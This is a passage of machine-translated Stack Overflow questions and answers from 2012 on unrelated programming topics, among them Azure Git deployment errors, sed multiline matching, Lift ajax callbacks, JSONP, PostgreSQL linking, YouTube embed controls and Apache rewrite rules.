    Models\AccountModels.cs(40,10): error CS0246: The type or namespace name 'CompareAttribute' could not be found (are you missing a using directive or an assembly reference?) [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
    Models\AccountModels.cs(73,10): error CS0246: The type or namespace name 'Compare' could not be found (are you missing a using directive or an assembly reference?) [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
    Models\AccountModels.cs(73,10): error CS0246: The type or namespace name 'CompareAttribute' could not be found (are you missing a using directive or an assembly reference?) [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj] 
```

请注意，这些编译错误针对我项目中的另一个程序集（我放置业务逻辑的程序集）。

谷歌搜索时，我发现的唯一提及是必须将这些引用的“本地副本”标志设置为 true。我已经尝试过了，但仍然遇到相同的错误。

这一切都在本地编译得很好。有任何想法吗？

## 更新

为了添加更多信息，我在 Git 存储库中的项目结构如下：

```
+ProjName
    ProjName.csproj
    web.config
    ...etc...
+ProjName.Common
    ProjName.Common.csproj
+ProjName.Tests
    ProjName.Tests.csproj
+packages <-- these are Nuget packages
ProjName.sln 
```

Azure 显示的编译错误表明失败的是 ProjName.vcproj - 但它们指的是 ProjName.Common 程序集参考。

请注意，此布局是 VisualStudio 创建的（即 webroot 的额外项目子目录）。

我不确定 Azure 在进行 Git 部署时会做什么。它是否认识到 ProjName 目录是 webroot，并且还解析 ProjName.sln 编译解决方案中的任何其他程序集（与 Visual Studio 相同）？

另外，我没有向 Git 添加任何“bin”文件夹。但是，我只是将其作为测试进行了尝试，它并没有改变 Azure 产生的编译错误。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-22T17:03:15.113

2012 年 11 月 25 日更新：查看 Dan 的 repo 后，问题是库项目使用 GAC 中的 Mvc 4 而不是使用 NuGet 包。切换到 NuGet 包可以使其在 Azure 上正常工作。

理论上，MVC4 可以在 Azure 机器上的 GAC 中，这不是问题。也许他们会在某个时候到达那里。虽然一般来说，MVC 团队越来越多地推动基于 NuGet 的模型，您不依赖于 GAC 中的东西。

原答案：

通常，您应该避免将二进制文件提交到您的 git 存储库，而是依靠 NuGet 来检索它们。请参阅[https://github.com/KuduApps/Mvc4ApplicationFx40WithLib](https://github.com/KuduApps/Mvc4ApplicationFx40WithLib)以获取执行此操作并在 Azure 网站中正常工作的示例项目。

但根据您的项目结构，我看到您的项目似乎使用 C++ (.vcproj)。如果是这样，那么可能的问题是今天通过 git 发布时，Azure 网站可能不支持 C++。到目前为止，我不认为人们必须使用 C# 和 VB。如果这确实是问题，那么我建议您在[https://github.com/projectkudu/kudu](https://github.com/projectkudu/kudu)上打开一个问题，以便我们可以正确跟踪它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T09:26:53.270

所以我的 .Common 程序集引用了 System.Web.Mvc 和 WebMatrix.WebData，看起来 Azure 不支持。我有一些成员代码，它们在公共程序集中而不是 Web 项目中使用这些引用。删除那些，删除错误。我将不得不稍微重构代码，以便公共库不需要这些引用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-27T12:45:26.343

我今天在天蓝色的训练营遇到了这个问题。

在解决方案上启用 Nuget 包还原并将这些更改提交到 github 存储库启用成功部署

# javascript - 如果选中复选框，文本应该换行

> ID：13429868
> 
> 赞同：1
> 
> 时间：2012-11-17T10:55:36.243
> 
> 标签：javascript, android, css, webview

我正在使用 android web-view 并且在 web-view 中我正在显示正在显示的网页`CSS`，`JavaScript`所以我希望每当我选择复选框并尝试缩放页面时它应该换行，否则它不应该。为此，我试图设置`CSS`-

**w.loadUrl("javascript:(function() {" + "document.getElementByTagName('html')[0].style.whiteSpace='nowrap';})");**

但我正在通过编程更改这些属性，但它不会影响文本内容，所以请告诉我如何在选中复选框时将网页文本设置为换行，如果未选中复选框，它不应该换行，请给我任何建议？提前致谢。

# regex - 正则表达式：匹配除逗号以外的任何字符（包括空格）

> ID：13429869
> 
> 赞同：0
> 
> 时间：2012-11-17T10:55:43.730
> 
> 标签：regex, string, sed, string-parsing

我想用正则表达式匹配除逗号之外的任何字符和任何空格。只匹配除逗号以外的任何字符给我：

```
[^,]* 
```

但我也想匹配字符串中任何地方的任何空白字符、制表符、空格、换行符等。

编辑：

这是通过 :%s/foo/bar/gc 在 vi​​m 中使用 sed。

我想从 func 开始直到逗号，在以下示例中：

```
func("bla bla bla"
  "asdfasdfasdfasdfasdfasdf"
"asdfasdfasdf", "more strings") 
```

一世

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:13:00.367

要在使用`multiline`中`SED`使用`RegEx`，您应该看看[这里](https://unix.stackexchange.com/questions/26284/how-can-i-use-sed-to-replace-a-multi-line-string)。

**编辑：**

在`SED`命令中，使用 NewLine 有点不同。`SED`命令支持三种模式来管理多行操作`N`，`P`以及`D`. 要了解它是如何工作的，请参阅[此](http://www.grymoire.com/Unix/Sed.html#toc-uh-51)（使用多行）说明。这里讨论这三个操作。

我的猜测是`N`operator 是这里缺少的考虑区域。添加`N`运算符将允许`\n`在字符串中进行感知。

[这里](http://www.grymoire.com/Unix/Sed.html#toc-uh-nl)的一个例子：

> 有时希望在 sed 脚本中使用换行符。好吧，这里有一些微妙的问题。如果要搜索新行，则必须使用“\n”。这是一个示例，您搜索一个短语，然后删除该短语之后的换行符 - 将两行连接在一起。
> 
> (回声 a;回声 x;回声 y) | sed '/x$/ { N s:x\n:x: }'
> 
> 这会产生
> 
> 一个 xy
> 
> 但是，如果要插入新行，请不要使用 "\n" - 而是插入文字换行符：
> 
> (回声 a;回声 x;回声 y) | sed 's:x:X\:'
> 
> 生成
> 
> 一个 X
> 
> 是的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T18:38:07.460

所以基本上你试图在多行上匹配一个模式。

这是一种方法`sed`（很确定这些在内部不可`vim`用，而且我不知道如何在内部复制它`vim`）

```
sed '
    /func/{
            :loop
            /,/! {N; b loop}
            s/[^,]*/func("ok"/
    }
' inputfile 
```

假设`inputfile`包含这些行

```
func("bla bla bla"
  "asdfasdfasdfasdfasdfasdf"
"asdfasdfasdf", "more strings") 
```

输出是

```
func("ok", "more strings") 
```

* * *

**详情**：

*   如果一行包含`func`，请输入大括号。
*   `:loop`是一个名为的标签`loop`
*   如果该行不包含`,`（这就是`/,/!`意思）
    *   将下一行附加到模式空间 ( `N`)
    *   分支到/转到`loop`标签 ( `b loop`)
*   因此，它将继续追加行并循环直到`,`找到，然后`s`运行命令，该命令将第一个逗号之前的所有字符与（多行）模式空间匹配，并执行替换。

# javascript - 从静态 javascript 提升会话有效的 ajax 回调

> ID：13429871
> 
> 赞同：2
> 
> 时间：2012-11-17T10:56:20.657
> 
> 标签：javascript, ajax, lift

我目前正在使用服务器端的lift和d3（一个javascript可视化框架）来实现一个图形可视化工具，用于所有可视化。我遇到的问题是在脚本中我想从服务器获取会话相关数据。

所以基本上，我的目标是在静态 js 脚本中编写提升有效的 ajax 回调。

# 到目前为止我尝试过的

如果您认为最好的解决方案是我已经尝试过的解决方案，请随时发布详细的答案，告诉我如何准确使用它以及它如何完全解决我的问题。

### 使用lift在另一个脚本中编写ajax回调并从主脚本中调用它

这种类似于隐藏文本输入的解决方案可能更有可能起作用。但是它并不优雅，这意味着我必须在加载时加载很多脚本，这并不方便。

[正如邮件列表上的讨论中](https://groups.google.com/forum/#!topic/liftweb/ZDSsDMj-KRk/discussion)所解释的，这似乎是电梯社区中首选的解决方案之一。

### REST接口

通常，从 lift 中的 javascript 函数获取数据的方法是创建一个 REST 接口。但是，此界面不会链接到任何会话。这是我从上一个问题中得到的解决方案：[Get json data in d3 from lift snippet](https://stackoverflow.com/questions/12800612/get-json-data-in-d3-from-lift-snippet)

### 将函数作为脚本的参数

另一种解决方案是将 ajaxcallback 作为调用以生成我的图形的主脚本的参数。但是我希望有很多回调，我不想弄乱我的脚本的参数。

### 在lift中编写整个脚本，然后将其提供给客户端

这个解决方案可以很优雅，但是我的脚本很长，我真的希望它保持静态。

# 我想要的是

### 在客户端

在查看我网页的源代码时，我发现 ajaxSelect 的回调是：

```
<select onchange="liftAjax.lift_ajaxHandler('F966066257023LYKF4=' + encodeURIComponent(this.value), null, null, null)" name="F96606625703QXTSWU" id="node_delete" class="input"> 
```

此外，网页末尾还有一个包含页面状态的变量：

```
var lift_page = "F96606625700QRXLDO"; 
```

所以，我想知道是否可以使用这个`liftAjax.lift_ajaxHandler`函数来模拟我的 ajaxcall 是有效的。但是我不知道要使用的确切合成器。

### 在服务器端

由于我在客户端“伪造”了一个请求，我现在想在客户端获取请求并将其分派给正确的函数。这是`LiftRules.dispatch`对象似乎是最好的解决方案的地方：当它被调用时，所有会话管理都已完成（请求已验证并链接到会话），但是我不知道如何在`append`功能。

### 评论

在 lift 中，所有变量的名称都更改为随机字符串以提高安全性，我希望在我的应用程序中具有相同的行为，即使这可能意味着我将不得不“给”javascript 这些值。然而，一个 15 个字符串值的数组仍然比 15 个函数作为 javascript 函数的参数更好。

### 编辑

在跟踪我的研究时，我发现了这个页面：[将服务器功能映射到客户端操作](https://www.assembla.com/spaces/liftweb/wiki/Mapping_server_functions_to_client_actions)，它以某种方式解释了命名函数的目标，即使它仍然没有引导我找到一个可行的解决方案。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-17T16:39:13.767

## 快速回答

在电梯中休息不必是无国籍的。如果您使用 LiftRules.dispatch.append 注册您的 RestHelper，那么它将被有状态地处理，并且会话信息将照常通过 S 对象提供。

## 长答案

既然您似乎很感兴趣，而且它之前就出现过，这里有一个更详细的解释，说明如何在 Lift 中注册和调用服务器端函数。如果您有一段时间没有使用 Lift，请移开视线。以下内容不应以任何方式用于评估 Lift 或其复杂性。这纯粹是库开发人员级别的东西，大多数 Lift 用户在进行开发时都没有意识到这一点。

### 这个怎么运作

当您创建有状态回调时，通常使用 SHtml 对象中的方法，您真正要做的是在用户会话的上下文中注册 S.AFuncHolder 类型的对象，每个对象都有一个唯一的 ID。在此过程中生成的唯一 ID 就是您遇到类似模式时所看到的`F96606625700QRXLDO`. 当通过表单 post、ajax 或其他方式提交数据时，Lift 将检查对这些函数 ID 的请求并执行相关函数（如果存在）。有几个助手可以提供更具体的 AFuncHolder 类型，例如 S.SFuncHolder（接受单个字符串查询参数）和 S.BinFuncHolder（参数是多部分表单数据），但它们都返回 Any 并且在幕后 Lift 将收集这些返回值创建正确类型的响应。例如，一个 JsCmd 将产生一个执行命令的 JavaScriptResponse。您也可以直接返回 LiftResponse。

### 如何使用它

AFuncHolders 使用 S.fmapFunc 方法注册。你会这样称呼它

```
S.fmapFunc(SFuncHolder({ (str: String) =>
  doSomethingAwesomeWithAString(str)
}))(id => <input type="text" name={id} value=""/>) 
```

第一个参数是你的函数，包装在正确的 *FuncHolder 类型中，第二个参数是一个函数，它接受生成的 id 并输出*something*。获得输出的*内容*就是您将包含在页面上的内容。它应该以某种方式导致将 id 作为查询参数发送到服务器，以便执行您的函数。

### 把它们放在一起

您可以使用上述方法进行自己的 Ajax 调用，但是当 Lift 进行 ajax 调用时，还有一些其他注意事项：

1) 大多数浏览器只允许同时连接到一个给定的域。三似乎是一个神奇的数字。2) AFuncHolders 通常会关闭它们所包含的片段的范围，如果一次处理多个 ajax 请求，每个请求都在自己的线程中，可能会发生不好的事情。

为了解决这些问题，该`liftAjax.lift_ajaxHandler`函数对每个 ajax 请求进行排队，确保一次只将一个请求发送到服务器。

这种方法的缺点是，在需要将结果传递给回调的地方进行 Ajax 调用会很困难。例如，JQuery 自动完成功能在接受匹配列表的输入更改时提供回调函数。如果您手动调用 LiftAjax.lift_ajaxHandler，您可以为成功和错误提供自己的回调函数，我建议您在浏览器中查看这些函数的源代码，以获取有关它们如何工作的更多信息。

实际上还有更多内容，例如 Lift 如何在 ajax 回调中恢复 RequestVars（这是 lift_page 的来源，但这就是我准备在周六早上喝咖啡时解释的全部内容：）

祝你的应用好运！

# c# - Xaf 中的条件规则

> ID：13429872
> 
> 赞同：0
> 
> 时间：2012-11-17T10:56:26.457
> 
> 标签：c#, devexpress, xaf

我正在使用 XAF，我有一个 Questions 业务对象和 Answers 业务对象。这些业务对象之间存在一对多的关系。每个问题必须有一个正确答案。如果有多个正确答案或没有正确答案，我应该取消保存。我怎样才能满足这个条件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-19T10:03:59.097

您可以使用内置的[XAF 验证模块](http://documentation.devexpress.com/#Xaf/CustomDocument3009)和[RuleCriteria 属性](http://documentation.devexpress.com/#Xaf/clsDevExpressPersistentValidationRuleCriteriaAttributetopic)。如果您的业务规则无法通过[Criteria Language 语法](http://documentation.devexpress.com/#XPO/CustomDocument4928)表达，那么您可以使用[RuleFromBooleanProperty](http://documentation.devexpress.com/#Xaf/clsDevExpressPersistentValidationRuleFromBoolPropertyAttributetopic)属性并在代码中编写您想要的任何逻辑。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T12:08:40.607

```
public partial class Question:XPObject
{
    protected override void OnSaving()
    {
        if(this.Answers.Count == 1) base.OnSaving();
        else throw new UserFriendlyException( "You need to have one correct answer." );
    }
} 
```

# javascript - 使用 JSONP 的 AJAX 跨域数据

> ID：13429873
> 
> 赞同：1
> 
> 时间：2012-11-17T10:56:26.130
> 
> 标签：javascript, jquery, json, jsonp

我正在尝试从 Geobytes 获取数据。其中一个模板返回 JSON，我需要跨域访问它。

我写了这两个函数

```
function getCountry(ip) {
    var surl = "http://www.geobytes.com/IpLocator.htm?GetLocation&template=json.txt";
    $.ajax({
        url: surl,
        data: '{"ipaddress":"' + ip + '"}',
        dataType: "jsonp",
        processData: false,
        jsonpCallback: "jsonpcallback",
        error: function (xhr, status, error) {
            alert(xhr.responseText);
        }
    });
}

function jsonpcallback(rtndata) {
    alert(rtndata.message);
} 
```

调用成功执行，这些是我的响应标头：

```
HTTP/1.1 200 OK
Date: Sat, 17 Nov 2012 12:43:54 GMT
Expires: 0
Content-type: text/html
Transfer-Encoding: chunked 
```

返回的数据是 JSON，但我得到

> 警告：资源解释为脚本，但使用 MIME 类型 text/html 传输：“http://www.geobytes.com/IpLocator.htm?GetLocation&template=json.txt&callback=jsonpcallback&{%22ipaddress%22:%22200.167.254.166%22} &_=1353148931121"
> 
> 远程 IpLocator.htm 上的错误：未捕获 SyntaxError：意外令牌：

在返回的数据上引发错误

```
{"geobytes":{"countryid":117, 
```

我想可能是因为它是 117 而不是“117”，但我显然无法控制返回的数据。试图添加一个“processData = false”，但这没有帮助。

我已将错误处理添加到 ajax 并在状态上获取“parsererror”

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T11:21:35.300

尝试像这样修改字段数据类型：

```
...
数据类型：“jsonp json”，
...

```

这样你得到的数据就会被解析为json。

遵循文档：

> 您期望从服务器返回的数据类型。如果没有指定，jQuery 将尝试根据响应的 MIME 类型推断它。

在您的情况下，您获得的 MIME 是 text/html，将“json”值添加到 dataType，您告诉 jQuery 将响应视为 json 而不是文本。

如果服务不支持 JSONP，您可以制作自己的代理页面来处理请求，或使用 YQL，如下所述：[服务器不支持 JSONP 时的跨域请求](https://stackoverflow.com/questions/13195063/cross-domain-request-when-server-does-not-support-jsonp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T15:16:57.513

感谢[no.andrea](https://stackoverflow.com/users/993100/no-andrea/ "没有安德里亚")为我指明了正确的方向！

当我使用 MVC3 时，我添加了一个新控制器

```
[HttpPost]
public JsonResult JsonGetCountry(string ip)
{
    try
    {
        var sb = new StringBuilder();
        sb.Append("http://www.geobytes.com/IpLocator.htm?GetLocation");
        sb.Append("&template=json.txt");
        sb.Append("&IpAddress=");
        sb.Append(ip);

        var webClient = new WebClient();
        var data = webClient.OpenRead(sb.ToString());

        if (data == null) { return Json(""); }

        var reader = new StreamReader(data);
        var msg = reader.ReadToEnd();
        data.Close();
        reader.Close();

        return Json(msg);
    }
    catch (Exception ex)
    {
        throw new Exception(ex.Message, ex);
    }
} 
```

并将我的 JQuery 函数更新为

```
function getCountry(ip) {
    $.ajax({
        type: "POST",
        url: "/My-Shop/IP/JsonGetCountry",
        data: '{"ip":"' + ip + '"}',
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        success: function (msg) {
            var a = $.parseJSON(msg);
            alert(a.geobytes.iso2);
        },
        error: function (ex) {
            alert(ex.statusText);
    }
}); 
```

这解决了我所有的问题:)

# ubuntu-12.04 - 安装 barnyard2 ubuntu 12.04

> ID：13429876
> 
> 赞同：0
> 
> 时间：2012-11-17T10:56:44.977
> 
> 标签：ubuntu-12.04, snort

我试图在 ubuntu 12.04 32 位中安装 barnyard2

我正在使用语法进行配置：

> ./configure --with-mysql-libraries=/usr/lib/x86_64-linux-gnu

当我尝试使用 makefile 编译 daq-1.1.1 时，遇到以下错误：

> make[3]: 离开目录`/root/snortinstall/barnyard2/src' make[2]: Leaving directory`/root/snortinstall/barnyard2/src' make all in etc make[2]: 进入目录`/root/snortinstall/barnyard2/etc' make[2]: Nothing to be done for`all'. make[2]: 离开目录 `/root/snortinstall/barnyard2/etc' Making all in doc make[2]: Entering directory`/root/snortinstall/barnyard2/doc' make[2]: Nothing to be done for `all'. make[2]: Leaving directory` /root/snortinstall/barnyard2/doc' 在 rpm make[2]: 进入目录`/root/snortinstall/barnyard2/rpm' make[2]: Nothing to be done for`all'. make[2]: 离开目录 `/root/snortinstall/barnyard2/rpm' Making all in schemas make[2]: Entering directory`/root/snortinstall/barnyard2/schemas' make[2]: Nothing to be done for `all'. make[2]: Leaving directory` /root/snortinstall/barnyard2/schemas' 在 m4 中制作所有 make[2]: 进入目录`/root/snortinstall/barnyard2/m4' make[2]: Nothing to be done for`all'. make[2]: 离开目录 `/root/snortinstall/barnyard2/m4' make[2]: Entering directory` /root/snortinstall/barnyard2' make[2]: 没有为 `all-am'. make[2]: Leaving directory`/root/snortinstall/barnyard2' 做任何事情 make[1]: 离开目录 `/root/snortinstall/barnyard2'

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-13T12:48:39.107

try this

```
sudo ./configure --with-mysql --with-mysql-libraries=/usr/lib 
```

or

```
sudo ./configure --with-mysql --with-mysql-libraries=/usr/lib32 
```

for me it worked with

```
sudo ./configure --with-mysql --with-mysql-libraries=/usr/lib64 
```

but I am useing ubuntu 12.04 64bit

# java - 如何在服务中运行？

> ID：13429878
> 
> 赞同：0
> 
> 时间：2012-11-17T10:57:04.393
> 
> 标签：java, android, multithreading, service

我已经实现了一个在单独的进程中运行的服务。

该服务包含一个单独的线程，我有一个套接字连接。该线程有一个 run() ，它不断地向端口发送数据。

我的问题是在线程中触发 run() 后我不再与它有任何联系，我可以在打开套接字的程序中看到它有意识地发送数据但想法是我在它运行时例如，我可以更改它发送的数据。

这是我在外部线程中的运行：

```
public void run()
{

        if(run) 
            {

            // Team and player names message is sent when entering in a game

            setBaseMessage();
            SendMessageToCOMPort(base_message + CalculateCRC(base_message));
            sleep();  // waits for 100 ms
           }
} 
```

有人知道可能出了什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:37:21.190

我不太明白你的问题。似乎您想在服务中运行一个单独的线程来进行一些套接字通信。此外，您希望能够影响线程使用套接字发送的数据。

> 我已经实现了一个在单独的进程中运行的服务。

首先，默认情况下，android 服务不会在单独的进程或线程中运行。因此，要运行长时间运行的操作，您必须自己使用 Java 线程开发多线程，并按照您的做法实现 run 方法。

单个进程的线程共享相同的内存。因此，要影响套接字线程正在做什么，您可以使用线程之间共享的数据结构，如队列或列表。例如，您可以应用生产者-消费者模式。生产者将数据传递到共享队列。消费者使用队列中的数据并对其进行处理。但是，请注意您必须同步对共享队列的访问。

我希望我能够澄清这个问题并给你一些解决问题的建议。

# iframe - Youtube Iframe 禁用暂停视频

> ID：13429884
> 
> 赞同：14
> 
> 时间：2012-11-17T10:57:56.483
> 
> 标签：iframe, youtube, youtube-api

我需要在我的网页上播放视频。但我需要拒绝控制。我放了“controls = 0”，但是当我点击它时播放器有暂停动作。我可以在 YouTube 播放器中禁用“暂停”操作吗？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2015-04-07T03:25:25.797

在 DOM 元素上使用以下 CSS：

```
.ytplayer {pointer-events: none;} 
```

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2012-11-28T15:41:18.490

您可以尝试在视频上放置一个 div 容器，上面没有任何内容。换句话说，一个与视频本身大小相同的空白容器。这应该做的是当有人试图点击它时，他们实际上会点击它上面的透明容器并且无法暂停。这应该有效。您可能还需要更改 z-index 以确保空白 div 容器真正位于视频上方。（首先使用背景颜色测试 div 容器，如果彩色框覆盖了视频，那么您可以返回并删除颜色，它会起作用。）祝你好运。

此外，将`disablekb`参数设置为 1，这样用户即使按空格键也无法暂停。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2016-04-19T18:44:24.103

如果您通过 HTML 显示视频并且可以访问用于显示视频的 CSS 类，则可以执行以下操作。

您的 HTML 将如下所示：

```
<iframe id="ytplayer" type="text/html" width="720" height="405"
src="https://www.youtube.com/watch?v=z4O-5eV4LiA"
frameborder="0" allowfullscreen> 
```

添加您选择的类名，我选择 ytplayer

```
class="ytplayer" 
```

我的示例如下所示

```
<iframe class="ytplayer" id="ytplayer" type="text/html" width="720" height="405"
src="https://www.youtube.com/watch?v=z4O-5eV4LiA"
frameborder="0" allowfullscreen> 
```

然后在你的 CSS 文件中添加修改你的类的规则。我使用了 ytplayer，但您可以选择不同的类名，请确保它与您上面使用的类名匹配。

```
.ytplayer {
pointer-events: none;
position: absolute;
} 
```

那应该这样做。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-11-19T21:55:47.763

没有办法完全禁用暂停。

[您可以在onStateChange](https://developers.google.com/youtube/iframe_api_reference#onStateChange)处理程序中侦听`YT.PlayerState.PAUSED`事件，并在检测到事件时立即调用 playVideo() ，但是...我不知道，这听起来对用户不太友好。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-17T16:03:27.037

“ ?controls=0 ” 仅在播放器中隐藏底部控制面板，但在单击屏幕时播放/暂停将正常工作

以下是控制参数值：

*   controls=0 – 播放器控件不显示在播放器中。对于 AS3 播放器，Flash 播放器会立即加载。
*   controls=1 – 播放器控件显示在播放器中。对于 AS3 播放器，Flash 播放器会立即加载。
*   controls=2 – 播放器控件显示在播放器中。对于 AS3 播放器，Flash 播放器在用户启动视频播放后加载。

检查这篇文章这真的很有帮助 [https://developers.google.com/youtube/player_parameters](https://developers.google.com/youtube/player_parameters)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-11-13T16:47:06.417

这是一种阻止屏幕的方法，因此用户无法单击任何内容。

```
// block screen so user cant click
var blockDiv = $(document.createElement('div'))
        .attr('id', 'blockDiv')
        .height('100%').width('100%')
        .css({'z-index':'3333', 'position' : 'absolute', 'top': '0', 'left':'0'});
$('body').append(blockDiv); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-07-26T15:43:49.477

这是我的代码解决方案，可以让视频自动播放而不能在桌面上暂停但允许在移动设备上

```
 <style>
  .overlay {
    position: absolute;
    top: 0;
    bottom: 0;
    right: 0;
    left: 0;
    /* knock out nasty borders */
    outline: 2px solid white !important;
    outline-offset: -1px;
    pointer-events: none;
  }

  .wrapper-with-intrinsic-ratio {
    position: relative;
    padding-bottom: 56.25%;
  }

  .element-to-stretch iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #ffff;
  }

  .wrapper-with-intrinsic-ratio .element-to-stretch {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
  }

  @media only screen and (max-width: 900px) {
    .noclick {
      display: none;
    }
  }

  .noclick {
    z-index: 2000;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
  }
</style>
<div class="target2">
<div class="noclick"></div>
<div class="wrapper-with-intrinsic-ratio">
<div class="element-to-stretch">
<div class="overlay"><iframe title="YouTube video player" src="https://www.youtube.com/embed/tgbNymZ7vqY?rel=0&amp;autoplay=1&amp;controls=0&amp;disablekb=1&amp;loop=1&amp;playlist=tgbNymZ7vqY&amp;playsinline=1&amp;iv_load_policy=3&amp;mute=1&amp;widgetid=1&amp;widget_referrer" width="100%" height="100%" frameborder="0" allowfullscreen=""></iframe></div>
</div>
</div>
</div> 
```

注意让视频重复播放，而不是自动播放播放列表中的下一个项目 将播放列表设置为视频 id(youtube) 不会在浏览器视频中的移动设备上进行视频推荐

# c++ - 链接postgresql时出现C++链接错误

> ID：13429885
> 
> 赞同：2
> 
> 时间：2012-11-17T10:58:06.220
> 
> 标签：c++, postgresql-9.1

在编译我的代码时，我遇到了如下问题：

```
io.cpp:21: undefined reference to `PQconnectdb' 
```

以及在我的代码中发生的所有其他缺少 postgres 函数调用的实例。显然这是一个链接问题，我只是不确定链接问题是什么。

我正在编译以下内容：

```
mpiCC -c -O2 -g -Wall -Werror -I /usr/include/postgresql/ decisioning_mpi.cpp
g++ -c -O2 -g -Wall -Werror -I /usr/include/postgresql/ io.cpp
g++ -c -O2 -g -Wall -Werror -I /usr/include/postgresql/ calculations.cpp
g++ -c -O2 -g -Wall -Werror -I /usr/include/postgresql/ rules.cpp
g++ -c -O2 -g -Wall -Werror -I /usr/include/postgresql/ Instrument.cpp
g++ -c -O2 -g -Wall -Werror -I /usr/include/postgresql/ Backtest_Parameter_CPO.cpp
g++ -c -O2 -g -Wall -Werror -I /usr/include/postgresql/ Backtest_Trade_CPO.cpp
g++ -c -O2 -g -Wall -Werror -I /usr/include/postgresql/ Data_Bar.cpp
mpiCC -o decisioning_mpi -O2 -g -Wall -Werror -L/usr/lib -lm -lpq decisioning_mpi.o 
io.o calculations.o rules.o Instrument.o Backtest_Parameter_CPO.o Backtest_Trade_CPO.o Data_Bar.o 
```

应该注意的是，这是*libpq-fe.h*的正确目录并且我正在链接 pq，所以我不确定为什么 postgres 函数没有正确链接。我正在运行 Ubuntu 12.04 并从 synaptic 安装 psql (PostgreSQL) 9.1.6。我也会把它短路，我正在使用#include“libpq-fe.h”。

关于如何解决此链接问题的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:08:22.403

放在`-L/usr/lib/ -lm -lpq`链接命令的末尾，链接器可以找到符号

```
mpiCC -o decisioning_mpi -O2 -g -Wall -Werror decisioning_mpi.o io.o \
calculations.o rules.o Instrument.o Backtest_Parameter_CPO.o \
Backtest_Trade_CPO.o Data_Bar.o -L/usr/lib -lm -lpq 
```

GCC 链接参考： http: [//www.network-theory.co.uk/docs/gccintro/gccintro_18.html](http://www.network-theory.co.uk/docs/gccintro/gccintro_18.html)

# javascript - addDay() 函数在 Data.js 中返回错误值

> ID：13429886
> 
> 赞同：3
> 
> 时间：2012-11-17T10:58:24.857
> 
> 标签：javascript, datejs

我在我的网络应用程序中使用[Date.js](http://www.datejs.com/) ，当我从 "Mon Oct 8 00:00:00 UTC-0300 2012" 中减去一天时，它返回的是 "oct 6" 而不是 "oct 7"

这是我的代码：

```
var startTime = new Date(2012, 9, 8);
var beforeStare = startTime.clone().addDays(-1); 
```

![在此处输入图像描述](../Images/f8d36b12a99ab39d7228050400242712.png)

为什么会这样？如何解决这个问题？

我也试过这个`new Date(2012,9,7);`它返回

> 2012 年 10 月 6 日 23:00:00 UTC-0300

**注意**：我正在使用 `Asuncion(UTC-04:00)`TimeZone

[JSFiddler](http://jsfiddle.net/wDF9m/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:24:08.870

您将日期转换为 utc 进行计算并在向用户显示时转换为本地时区，这样您将确保您使用的所有日期都具有相同的标准。

```
// Creating the date "Oct 7 2012"
var date = new Date(2012, 9, 7);

//Convert to UTC in a safe way
var date_utc = new Date(date.getUTCFullYear(), date.getUTCMonth(), date.getUTCDate(),  date.getUTCHours(), date.getUTCMinutes(), date.getUTCSeconds());

//Make the calculation in UTC format
var beforeStare_utc = date_utc.addDays(-1);

//Show to the user in his/her local time
var beforeStare = new Date(beforeStare_utc + " UTC"); 
```

​</p>

这是[JSFiddle](http://jsfiddle.net/wDF9m/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-06T22:51:59.603

JavaScript 日期确切地知道两个时区：本地时间和 UTC。您可以从第三个时区解析日期，但 JavaScript 会立即忘记该时区，只会以当地时间或 UTC 的形式告诉您该日期。

前一天`Mon Oct 8 00:00:00 UTC-0300 2012`是`Mon Oct 7 00:00:00 UTC-0300 2012`。转换为您的本地时间 -0400，即`Mon Oct 6 23:00:00 UTC-0400 2012`.

[更新了 jsFiddle](http://jsfiddle.net/wDF9m/6/)

# php - apache mod_rewrite 规则编写

> ID：13429890
> 
> 赞同：1
> 
> 时间：2012-11-17T10:58:56.500
> 
> 标签：php, apache

在我的应用程序中，我试图链接`http://domain.com/auth/login`到它`/auth/register`在`http://domain.com/?p=auth&action=$`哪里`$`：`http://domain.com/auth/$`

我的代码是

```
RewriteEngine On
RewriteRule ^auth/(.+)$ ?p=auth&action=$1 
```

但现在我所有的CSS和图像都搞砸了._。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T11:10:49.883

看起来不错，但我建议使用完整的 url 代替重定向。并且为了减少与其他规则的交互，您应该添加`[L]`标志来停止与该规则匹配的请求的重写过程：

```
RewriteEngine On
RewriteRule ^auth/(.+)$ http://domain.com/?p=auth&action=$1 [L] 
```

* * *

和一般提示：如果您有权访问服务器配置，则将您的重写规则放在那里，而不是使用 .htaccess 样式重写。它更可靠，更易于配置：

```
RewriteEngine On
